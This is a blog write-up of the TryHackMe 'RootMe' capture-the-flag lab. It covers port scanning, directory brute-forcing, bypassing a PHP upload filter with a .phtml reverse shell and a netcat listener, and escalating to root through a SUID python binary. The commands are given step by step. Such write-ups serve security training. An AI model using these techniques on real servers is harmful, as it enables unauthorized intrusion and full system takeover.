---
layout: post
title:  "Tryhackme: RootMe"
date:   2021-02-01 19:57:56 +0200
categories: tryhackme
---

## Nmap Scan ##

### Initial Port Scan ###
```
sudo nmap -sS -p- -Pn -T5 -vv 10.10.80.111
```
```
Nmap scan report for 10.10.80.111
Host is up, received user-set (0.058s latency).
Scanned at 2021-01-31 17:07:37 EST for 567s
Not shown: 65527 closed ports
Reason: 65527 resets
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    open     http    syn-ack ttl 63
3632/tcp  filtered distccd no-response
11058/tcp filtered unknown no-response
44962/tcp filtered unknown no-response
45389/tcp filtered unknown no-response
51200/tcp filtered unknown no-response
55178/tcp filtered unknown no-response
```
Ok, so other than port 80 and 22 the rest are possibly behind a firewall or are just running services configured to not respond back.
### Targeted Port Scan ###
```
sudo nmap -sSCV -T5 -vv 10.10.80.111 -p22,80
```
```
Nmap scan report for 10.10.80.111
Host is up, received echo-reply ttl 63 (0.055s latency).
Scanned at 2021-01-31 17:19:36 EST for 22s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6kyRQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMiphYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GENFUhzNrUfryL02/EMt5pgfj8G7ojx5
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5KwMXdhMWEbPcF5JrZzhDTVERXqFstm7WA/5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## Directory Bruteforcing ##
```
gobuster dir -u http://10.10.80.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 16
```
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.80.111/
[+] Threads:        16
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/31 17:09:32 Starting gobuster
===============================================================
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
===============================================================
```
## File Upload ##
Trying to simply upload Kali's already existing ```/usr/share/webshells/php/php-reverse-shell.php``` will yield us an error:
![No PHP allowed img](./assets/images/RootMe/NoPHP.png)
Trying out to rename the file with a ```jpeg``` extension however, will allow us to upload the reverse shell to the remote server:
```
mv php-reverse-shell.php php-reverse-shell.php.jpeg
```
![JPEG allowed img](./assets/images/RootMe/JPEGYes.png)
Accessing the file through the ```uploads``` directory discovered in the previous we encounter an error, due to the server not knowing how to execute this file:
```
The image “http://10.10.80.111/uploads/php-reverse-shell.php.jpeg” cannot be displayed because it contains errors.
```
Let's try with another format:
```
mv php-reverse-shell.php php-reverse-shell.phtml
```
It works! Let's start our netcat listener and get our reverse shell:
```
nc -lvnp 1234
```
### Shell Stabilisation ###
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.4$ export TERM=xterm
export TERM=xterm
bash-4.4$ ^Z
zsh: suspended  nc -lvnp 1234
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg                                                                                   148 ⨯ 1 ⚙
[1]  + continued  nc -lvnp 1234

bash-4.4$ 
```

### Getting user flag ###
```
bash-4.4$ find / -type f -name user.txt 2>/dev/null
/var/www/user.txt
bash-4.4$ cat /var/www/user.txt
```

## Privilege Escalation ##
If we look for binaries that have the ```SUID``` bit set
```
bash-4.4$ find / -type f -perm -u=s 2>/dev/null
```
```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```
We notice that the ```python``` binary has the ```SUID``` bit set.
And thus, we can easily get a root shell with the following command:
```
bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# cat /root/root.txt
```